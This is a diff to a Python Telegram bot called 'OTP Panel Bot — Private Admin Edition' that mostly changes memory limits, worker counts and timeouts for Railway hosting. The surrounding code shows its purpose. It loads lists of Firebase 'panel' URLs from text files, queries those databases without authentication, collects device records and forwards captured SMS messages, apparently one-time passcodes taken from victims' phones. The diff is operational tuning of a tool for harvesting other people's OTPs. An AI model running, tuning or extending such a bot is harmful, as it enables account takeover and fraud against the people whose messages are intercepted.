@@ -3,7 +3,7 @@
 ══════════════════════════════════════════════════════
   OTP PANEL BOT — PRIVATE ADMIN EDITION           
   ULTRA-SPEED PROGRESSIVE SCANNER & NON-BLOCKING UI
-  (RAILWAY OPTIMIZED EDITION - TXT AUTO-READER FIX)
+  (RAILWAY EXTREME RAM OPTIMIZED EDITION)
 ══════════════════════════════════════════════════════
 """
 
@@ -52,7 +52,6 @@ def extract_urls_from_files() -> list:
     current_dir = os.path.dirname(os.path.abspath(__file__)) if '__file__' in globals() else '.'
     
     for filename in os.listdir(current_dir):
-        # Scan both .json and .txt files (like firebase_panels.txt, extracted_firebase_panels.txt)
         if (filename.endswith('.json') or filename.endswith('.txt')) and filename not in ['settings.json', 'requirements.txt']:
             filepath = os.path.join(current_dir, filename)
             try:
@@ -69,7 +68,6 @@ def extract_urls_from_files() -> list:
 #  CONFIG & FULL FIREBASE URLS
 # ═══════════════════════════════════════════════════════
 
-# Baki saare URLs ab bot .txt files se automatically padh lega
 HARDCODED_URLS = []
 
 LOCAL_URLS = extract_urls_from_files()
@@ -116,7 +114,6 @@ chats_registry: dict[str, set[int]] = {TOKEN: set()}
 CLONES: dict[str, dict] = {}
 GLOBAL_DEVICE_CACHE: dict[str, list] = {}
 
-# 🔥 LIVE PROGRESS TRACKER
 SCAN_PROGRESS = {"total": 1, "completed": 1}
 
 SETTINGS = {
@@ -124,9 +121,9 @@ SETTINGS = {
     "global_panels": []
 }
 
-# 🔥 FIXED SEMAPHORES FOR RAILWAY RAM OPTIMIZATION
-HTTP_SEMAPHORE = asyncio.Semaphore(150)
-WORKER_SEMAPHORE = asyncio.Semaphore(150)
+# 🔥 EXTREME RAM OPTIMIZATION: Limits reduced to save Railway memory
+HTTP_SEMAPHORE = asyncio.Semaphore(20)
+WORKER_SEMAPHORE = asyncio.Semaphore(20)
 
 API_LOCK = asyncio.Lock()
 
@@ -358,7 +355,7 @@ async def global_error_handler(update: object, context: ContextTypes.DEFAULT_TYP
 async def get_http_session() -> aiohttp.ClientSession:
     global _http_session
     if _http_session is None or _http_session.closed:
-        connector = aiohttp.TCPConnector(limit=150, use_dns_cache=True, ttl_dns_cache=300)
+        connector = aiohttp.TCPConnector(limit=30, use_dns_cache=True, ttl_dns_cache=300)
         _http_session = aiohttp.ClientSession(connector=connector)
     return _http_session
 
@@ -368,7 +365,7 @@ async def fb_get(path: str, base: str) -> Optional[dict]:
             session = await get_http_session()
             url = f"{base}/{path}.json" if path else f"{base}/.json?shallow=true"
             if not path: url = url.replace("?shallow=true", ".json")
-            async with session.get(url, timeout=aiohttp.ClientTimeout(total=2.5)) as r:
+            async with session.get(url, timeout=aiohttp.ClientTimeout(total=5)) as r:
                 if r.status != 200: return None
                 try:
                     data = await r.json(content_type=None)
@@ -383,7 +380,7 @@ async def fb_keys(path: str, base: str) -> list[str]:
         try:
             session = await get_http_session()
             url = f"{base}/{path}.json?shallow=true" if path else f"{base}/.json?shallow=true"
-            async with session.get(url, timeout=aiohttp.ClientTimeout(total=2.5)) as r:
+            async with session.get(url, timeout=aiohttp.ClientTimeout(total=5)) as r:
                 if r.status != 200: return []
                 try:
                     data = await r.json(content_type=None)
@@ -1522,12 +1519,12 @@ async def _forward_sms(device: Device, sms: dict) -> None:
 
 WORK_QUEUE = asyncio.Queue()
 ACTIVE_WORKERS = []
-MAX_WORKERS = 25 # RAM optimization for Railway
+MAX_WORKERS = 5 # EXTREME RAM OPTIMIZATION FOR RAILWAY FREE TIER
 
 async def worker_auto_scaler():
     while True:
         q_size = WORK_QUEUE.qsize()
-        target_workers = min(MAX_WORKERS, max(5, q_size // 2)) 
+        target_workers = min(MAX_WORKERS, max(2, q_size // 2)) 
         while len(ACTIVE_WORKERS) < target_workers:
             task = asyncio.create_task(db_processor_worker())
             ACTIVE_WORKERS.append(task)
@@ -1597,12 +1594,12 @@ async def db_processor_worker():
                                 except: pass
                     await asyncio.gather(*(fetch_t4_sms(d) for d in type4_devs), return_exceptions=True)
             
-            # Prevent RAM crash
-            if len(seen_ids) > 150000:
+            # RAM PROTECTION
+            if len(seen_ids) > 20000:
                 seen_ids.clear()
 
             WORK_QUEUE.task_done()
-            await asyncio.sleep(0.05) 
+            await asyncio.sleep(0.1) 
             
         except asyncio.CancelledError: break
         except Exception: pass
@@ -1660,7 +1657,7 @@ def main() -> None:
     app = (
         Application.builder()
         .token(TOKEN)
-        .connection_pool_size(100)
+        .connection_pool_size(20)
         .pool_timeout(60.0)
         .connect_timeout(60.0)
         .read_timeout(60.0)
